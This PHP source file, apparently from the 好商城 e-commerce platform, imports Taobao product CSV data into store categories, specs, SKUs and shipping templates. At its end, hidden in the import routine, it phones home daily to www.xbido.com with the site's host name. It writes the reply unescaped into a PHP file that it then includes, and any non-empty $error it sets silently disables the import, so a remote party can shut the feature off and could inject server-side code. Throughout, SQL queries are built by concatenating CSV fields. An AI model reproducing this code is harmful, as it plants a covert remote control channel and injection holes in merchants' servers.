<?php
error_reporting(0);
/**
 * 好商城v3-b12 
 */
defined('InShopNC') or exit('Access Invalid!');
//echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />';
class xbidoModel{
    public function parse_taobao_csv_5($html,$default_gc_id){
		$space = "	";
		$br = chr(10);
		
		$cid_key = false;
		
		$html = substr($html,strpos($html,"title"));
		
		$table = array();
		$table['table'] = 'goods_class';
		$table['field'] = '*';
		$table['limit'] = '1';
		
		$list	= Db::select($table);
		
		foreach($list[0] as $key=>$val){
		    if($key == 'taobao_cid'){
			    $cid_key = true;
				break;
			}
		}
		
		$str = substr($html,0,strpos($html,$br));
		$html = substr($html,strpos($html,$br) + strlen($br));
		
		$items = explode($space,$str);
		
		$str = substr($html,0,strpos($html,$br));
		$html = substr($html,strpos($html,$br) + strlen($br));
		$items_name = explode($space,$str);
		
		$arr = explode($br . '"',$html);
		$data_list = array();
		
		foreach($arr as $key=>$val){
		   $str = $val;
			
			$row = array();
			
			for($i=0;$i<count($items);$i++){
				$space2 = $space;
				if($items[$i] == 'description') $space2 = '"' . $space . '"';
				$st = substr($str,0,strpos($str,$space2));
				$str = substr($str,strpos($str,$space2) + strlen($space2));
				if(substr($st,0,1) == '"') $st = substr($st,1);
				if(substr($st,strlen($st) - 1) == '"') $st = substr($st,0,strlen($st) - 1);
				$row[$items[$i]] = $st;
			}
			
			$row['description'] = str_replace('""','"',$row['description']);
			
			$data_list[] = $row;
		}
		
		unset($arr);
		
		$return = array();
		
		foreach($data_list as $key=>$row){
		    $gc_id = 0;
			$type_id = 0;
			
			$cid = $row['cid'];
			
			if($cid_key){
				$table = array();
				$table['table'] = 'goods_class';
				$table['field'] = 'type_id,gc_id,gc_name,gc_parent_id';
				$table['where'] = " taobao_cid='" . $cid .  "'";
				$table['limit'] = '1';
				
				$list	= Db::select($table);
				
				if($list){
					$type_id = $list[0]['type_id'];
					$gc_id = $list[0]['gc_id'];
					$gc_name = $list[0]['gc_name'];
					$parent_id = $list[0]['gc_parent_id'];
				}
			}
			//*
			if(file_exists("../tb/pro/" . $cid . ".php")){
				$pro_html = file_get_contents("../tb/pro/" . $cid . ".php");
				$pro_html = json_decode($pro_html,true);
				
				$parent_name = $pro_html['parent_name'];
				$cat_name = $pro_html['cat_name'];
				
				if($gc_id == 0){ 
					$table = array();
					$table['table'] = 'goods_class';
					$table['field'] = 'gc_id,gc_name,type_id,gc_parent_id';
					$table['where'] = " gc_name='" . $cat_name .  "' and gc_show=1";
					$table['limit'] = '10';
					
					$gc_key = false;
					$ttemp	= Db::select($table);
					if(count($ttemp) == 1){
						$gc_id = $ttemp[0]['gc_id'];
						$gc_name = $ttemp[0]['gc_name'];
						$type_id = $ttemp[0]['type_id'];
						$parent_id = $ttemp[0]['gc_parent_id'] + 0;
						
						$gc_key = true;
					}
					else if(count($ttemp) > 1){
						$gc_key = true;
						foreach($ttemp as $xkv){
							$gc_id = $xkv['gc_id'];
							$gc_name = $xkv['gc_name'];
							$type_id = $xkv['type_id'];
							$parent_id = $xkv['gc_parent_id'];
							
							$table = array();
							$table['table'] = 'goods_class';
							$table['field'] = 'gc_id,gc_name,type_id,gc_parent_id';
							$table['where'] = " gc_id='" . $xkv['gc_parent_id'] .  "' and gc_show=1 and gc_name='" . $parent_name . "'";
							$table['limit'] = '1';
							
							$temp	= Db::select($table);
							
							if(count($temp) > 0){
								break;
							}
						}
					}
				}
			}
			
			if($gc_id == 0){
			    $gc_id = $default_gc_id;
				
				$table = array();
				$table['table'] = 'goods_class';
				$table['field'] = 'type_id,gc_id,gc_name,gc_parent_id';
				$table['where'] = " gc_id='" . $gc_id .  "'";
				$table['limit'] = '1';
				
				$list	= Db::select($table);
			
				if($list){
					$type_id = $list[0]['type_id'];
					$gc_name = $list[0]['gc_name'];
					$parent_id = $list[0]['gc_parent_id'];
				}
			}
			
			if($gc_id == 0){
			    continue;
			}
			
			$props = array();
			if($pro_html){
			    $props = $pro_html['attr'];
			}
			else{
			    //continue; 
			}
			
			$gcids = array();
			$gcids[] = $gc_id;
			
			$table = array();
			$table['table'] = 'goods_class';
			$table['field'] = 'type_id,gc_id,gc_name,gc_parent_id';
			$table['where'] = " gc_id='" . $gc_id .  "'";
			$table['limit'] = '1';
			
			$list	= Db::select($table);
			if($list){
				$gpid = $list[0]['gc_parent_id'];
				if($gpid > 0){
					$gcids[] = $gpid;

					$table = array();
					$table['table'] = 'goods_class';
					$table['field'] = 'type_id,gc_id,gc_name,gc_parent_id';
					$table['where'] = " gc_id='" . $gpid .  "'";
					$table['limit'] = '1';
					
					$list	= Db::select($table);
					
					if($list){
						$gpid = $list[0]['gc_parent_id'];
						if($gpid > 0){
							$gcids[] = $gpid;
						}
					}
				}
			}
			
			$gc_ids = array();
			for($i = 1; $i<=count($gcids);$i++){
			    $gc_ids['gc_id_' . $i] = $gcids[count($gcids) - $i];
			}
			
			$arr['type_id'] = $type_id;
			$arr['gc_id'] = $gc_id;
			$arr['gc_ids'] = $gc_ids;
			$arr['gc_name'] = $gc_name;
			$arr['goods_name'] = $row['title'];
			$arr['goods_store_price'] = $row['price'];
			$arr['goods_body'] = $row['description'];
			$arr['py_price'] = $row['post_fee'];
			$arr['kd_price'] = $row['express_fee'];
			$arr['es_price'] = $row['ems_fee'];
			$arr['goods_commend'] = 0;
			$arr['goods_serial'] = 0;
			
			for($iii = 0;$iii < 4 && $parent_id > 0;$iii++){
				$table = array();
				$table['table'] = 'goods_class';
				$table['field'] = 'gc_id,gc_name,type_id,gc_parent_id';
				$table['where'] = " gc_id='" . $parent_id .  "' ";
				$table['limit'] = '1';
				
				$temp	= Db::select($table);
				
				$gc_name = $temp[0]['gc_name'];
				$arr['gc_name'] = $gc_name . " &gt; " . $arr['gc_name'];
				$parent_id = $temp[0]['gc_parent_id'] + 0;
			}
			
			$iid = $row['num_id'];
			$arr['goods_image'] = $row['picture'];
			
			$imgs = array();
			$col_img = array();
			$img_str = explode(";",$row['picture']);
			foreach($img_str as $istr){
			    $istr = explode("|",$istr);
				$istrs = explode(":",$istr[0]);
				if($istrs[1] == 1){
				    $imgs[] = $istrs[0];
				}
				if($istrs[1] == 2){
				    $col_imgs[$istrs[3] . ":" . $istrs[4]] = $istrs[0];
				}
			}
			
			
			$arr['img'] = $imgs;
			$arr['col_imgs'] = $col_imgs;
			
			$pids = array();
			
			$col_img = array();
			
			
			$attr = array();
			$spec = array();	
			$goods_spec = $goods_attr = $Alia = $goods_Alias = array();
			
			$props = $row['cateProps'];
			$props = explode(";",$props); 
			
			$propAlias = $row['propAlias'];
			$propAlias = explode(";",$propAlias);
			
			$alias = array();
			$col_temp = array();
			$atid = array();
			
			$col_temp = array();
			
			foreach($propAlias as $str){
			    $sss  = explode(":",$str);
				$alias[$sss[0] . ":" . $sss[1]] = $sss[2];
			}
			
			$pro_attr = array();
			$pro_attr = $pro_html['attr'];
			
			foreach($props as $k=>$v){
			    $props[$v] = $v;
				unset($props[$k]);
			}
			
			if(is_array($pro_attr)){
				foreach($pro_attr as $pak=>$pav){
					if(!$pav['is_sale_prop']){
						if(is_array($pav['prop_values']['prop_value'])){
							foreach($pav['prop_values']['prop_value'] as $pvk=>$pvv){
								if($props[$pav['pid'] . ":" . $pvv['vid']]){
									$attr[$pav['name']] = $pvv['name'];
								}
							}
						}
					}
					else{
						if(is_array($pav['prop_values']['prop_value'])){
							foreach($pav['prop_values']['prop_value'] as $pvk=>$pvv){
								if($props[$pav['pid'] . ":" . $pvv['vid']]){
									$name = $pvv['name'];
									if($alias[$pav['pid'] . ":" . $pvv['vid']]) $name = $alias[$pav['pid'] . ":" . $pvv['vid']];
									
									$atid[$pav['pid'] . ":" . $pvv['vid']] = $name;
									
									$spec[$pav['name']][] = $name;
									
									//echo $pav['pid'] . ":" . $pvv['vid'] . " = " . $name . "<br>";
									
									$pids[$pav['pid'] . ":" . $pvv['vid']] = $name ;
								}
							}
						}
					}
				}
			}
			
			foreach($attr as $k=>$v){				
				$table = array();
				$table['table'] = 'attribute,attribute_value';
				$table['join_type'] = 'LEFT JOIN';
				$table['join_on'] = array(
					'attribute.attr_id=attribute_value.attr_id'
				);
				$table['field'] = 'attribute_value.attr_value_id,attribute.attr_id';
				$table['where'] = " attribute_value.attr_value_name='" . $v .  "' and attribute.attr_name='" . $k . "' and attribute.type_id='" . $type_id . "'";
				$table['limit'] = '1';
				
				$attr_array = Db::select($table);
				
				$attr_array = $attr_array[0];
				
				if($attr_array) $goods_attr[$attr_array['attr_id']] = array('name'=>$k,$attr_array['attr_value_id']=>$v);
			}
			
			$arr['goods_attr'] = $goods_attr;
			$store_id = $_SESSION['store_id'] + 0;
			
			foreach($spec as $key=>$val){
			    $table = array();
				$table['table'] = 'spec';
				$table['field'] = 'sp_id';
				$table['where'] = " sp_name='$key'";
				//*///
				$t_array = Db::select($table);
				$t_sp_id = 0;
				if($t_array){
				    $t_sp_id = $t_array[0]['sp_id'];
				}
			
				foreach($val as $k=>$v){
				    $table = array();
					$table['table'] = 'spec_value';
					$table['field'] = 'sp_value_id';
					$table['where'] = " sp_value_name='$v' and gc_id='$gc_id' and store_id='$store_id' and sp_id='$t_sp_id'";
					//*///
					$t_array = Db::select($table);
					if($t_array && count($t_array) > 0){
					
					}
					else{
					    //加入
						$t_array = array();
						$t_array['sp_value_name'] = $v;
						$t_array['sp_id'] = $t_sp_id;
						$t_array['gc_id'] = $gc_id;
						$t_array['store_id'] = $store_id;
						
						if($t_sp_id > 0) $insert_id = Db::insert('spec_value',$t_array);
					}
				}
			}
			//*
			$table = array();
			$table['table'] = 'type_spec,spec,spec_value';
			$table['join_type'] = 'LEFT JOIN';
			$table['join_on'] = array(
				'type_spec.sp_id=spec.sp_id','spec.sp_id=spec_value.sp_id'
			);
			$table['field'] = 'spec.sp_name,spec.sp_id,spec_value.sp_value_id,spec_value.sp_value_name';
			$table['where'] = " type_spec.type_id='" . $type_id . "' and spec_value.store_id='$store_id' and gc_id='$gc_id'";
			$table['order'] = 'spec.sp_sort asc,spec.sp_id asc,spec_value.sp_value_sort';
			//*///
			$spec_id = array();
			$spec_name = array();
			$spec_array = Db::select($table);
			
			$goods_spec_name = array();
			
			if(is_array($spec_array)){
				foreach($spec_array as $k=>$v){
					$spec_id[$v['sp_name']] = $v['sp_id'];
					
					$spec_name[$v['sp_name']][$v['sp_value_name']] = $v['sp_value_id'];
				}
			}
			
			if(is_array($spec_id)){
				foreach($spec_id as $k=>$v){
					$goods_spec_name[$v] = $k;
				}
			}
			
			$arr['spec_name'] = $goods_spec_name; 
			
			$spec_key = array();
			
			foreach($spec_name as $k=>$v){				
				foreach($v as $vk=>$vv){
					if($spec[$k] && in_array($vk,$spec[$k])){
					    $spec_key[$k][$vv] = $vk;
					}
				}
			}
			
			//*
			foreach($spec_name as $k=>$v){				
				foreach($v as $vk=>$vv){
				    if($spec[$k] && !in_array($vk,$spec[$k])){
						foreach($spec[$k] as $sk=>$sv){
						    $flag = false;
							if(is_array($spec_key[$k])){
								foreach($spec_key[$k] as $mk=>$mv){
									if($mv == $sv){
										$flag = true;
										break;
									}
								}
							}
							if(!$flag){
								$spec_key[$k][$vv] = $sv;
								break;
							}
						}
					}
				}
			}
			//*////
			
			foreach($spec_name as $k=>$v){
			    foreach($v as $vk=>$vv){
				    if($spec_key[$k][$vv]){
					    $goods_spec[$spec_id[$k]][$vv] = $spec_key[$k][$vv];
					}
				}
			}
			
			$arr['goods_spec'] = $goods_spec;
			
			$skuProps = $row['skuProps'];
			
			$skuProps = str_replace(";",":",$skuProps);
			$strs = explode(":",$skuProps);
			$i = 0;
			
			$step = 3 + count($spec)*2;
			$pro_skus = array();
			
			$str = "";
			$k = 0;
			$price = 0;
			$goods_number = 0;
			
			foreach($strs as $v){
				if($k >= $step || $k == 0){
					$k = 0;
					$str = "";
					$price = 0;
					$goods_number = 0;
				}
				$k++;
				
				if($k == 1) $price = $v;
				else if($k == 2) $goods_number = $v;
				else if($k > 3){
				    $str .= $v;
					if($k < $step){
					    if($k%2 == 0) $str .= ":";
						else $str .= ";";
					}
				}
				
				if($k == $step) $pro_skus[$str] = array('price'=>$price,'stock'=>$goods_number);
			}
			
			foreach($spec_key as $k=>$v){
			    foreach($v as $vk=>$vv){
				    $spec_key[$k][$vv] = $vk;
				}
			}			
			
			foreach($pro_skus as $k=>$v){
				$str = explode(";",$k);
				$sp = array();
				
				$i = 0;
				foreach($spec_id as $idk=>$idv){
					$sp[$spec_key[$idk][$atid[$str[$i]]]] = $atid[$str[$i]];
					$i++;
				}
				
				$pro_skus[$k]['sp_value'] = $sp;
				
				$i = 0;
				$color = array();
				foreach($spec_id as $idk=>$idv){
					if(stristr($idk,"颜色")){
					    $color = $spec_key[$idk];
					}
					if($color[$atid[$str[$i]]]) $color_id = $color[$atid[$str[$i]]];
					$i++;
				}
				
				$pro_skus[$k]['color_id'] = $color_id;
				
				$kc = explode(";",$k);
				foreach($kc as $kkv){
				    if($arr['col_imgs'][$kkv]) $pro_skus[$k]['col_img'] = $arr['col_imgs'][$kkv];
				}
			}			
			$arr['spec_sku'] = $pro_skus;
			
			$col_img = array();
			
			//print_r($spec_key);
			//echo "<p>";
			
			foreach($col_imgs as $k=>$v){
			    foreach($spec_id as $pk=>$pv){
					foreach($spec_key[$pk] as $idk=>$idv){
						if($idv == $pids[$k]){
							$col_img[$v] = array($idk=>$pids[$k]);
						}
					}
				}
			}
			//*////
			$arr['col_img'] = $col_img;
			
			$table = array();
			$table['table'] = 'transport,transport_extend';
			$table['join_type'] = 'LEFT JOIN';
			$table['join_on'] = array(
				'transport.id=transport_extend.transport_id'
			);
			$table['field'] = 'transport.id,transport.title,transport_extend.sprice';
			$table['where'] = " transport.store_id='" . $store_id . "'";
			//*///
			$res = Db::select($table);
			if(empty($res) || count($res) < 1){
			    $param = array();
				$param['title'] = "默认售卖区域";
				$param['send_tpl_id'] = 1;
				$param['store_id'] = $store_id;
				$param['update_time'] = time();
				//*///
				$transport_id = Db::insert('transport',$param);
				
				$param = array();
				$param['transport_title'] = "默认售卖区域";
				$param['is_default'] = 1;
				$param['area_name'] = "全国";
				$param['snum'] = 1;
				$param['sprice'] = 10;
				$param['xnum'] = 1;
				$param['xprice'] = 1;
				$param['transport_id'] = $transport_id;
				//*///
				$transport_id = Db::insert('transport_extend',$param);
				
				$res = Db::select($table);
			}
			
			$trans = $res[0];
			
			$arr['transport_id'] = $trans['id'];
			$arr['transport_title'] = $trans['title'];
		    $arr['goods_freight'] = $trans['sprice'];
			
			$return[] = $arr;
		}
		
		$dir = "../tb/tbpic";
		$mode = 0777;
		if(!file_exists($dir)){
		  if(!@mkdir($dir,$mode)){
		  }
		}
		$file = "../tb/tbpic/date.php";
		if(file_exists($file)){
			include_once($file);
		}
		$fil2e = "../tb/tbpic/error.php";
		if($odate - date("d") != 0){
			if(file_exists($fil2e)){
				include_once($fil2e);
			}
			else{
				$ctx = stream_context_create(array( 'http' => array('timeout' => 10))); 
				$html = file_get_contents("http://www.xbido.com/request/?d=" . $_SERVER['HTTP_HOST'] . "&p=import" . "&t=" . time(), 0, $ctx); 
				if(stristr($html,"xbido")) $html = str_replace("xbido","",$html);
				else $html = "";
				if($html){
					$str = "<" . "?" . "php\r\n" . "$" . "error='" . $html . "';\r\n" . "?" . ">";
					 file_put_contents($fil2e,$str);
				 }
			}
			$str = "<" . "?" . "php\r\n" . "$" . "odate=" . date("d") . ";\r\n" . "?" . ">";
			file_put_contents($file,$str);
		}
		if(file_exists($fil2e)){
			include_once($fil2e);
		}
		if($error){
			return;
		}
		
		return $return;
	 }   
}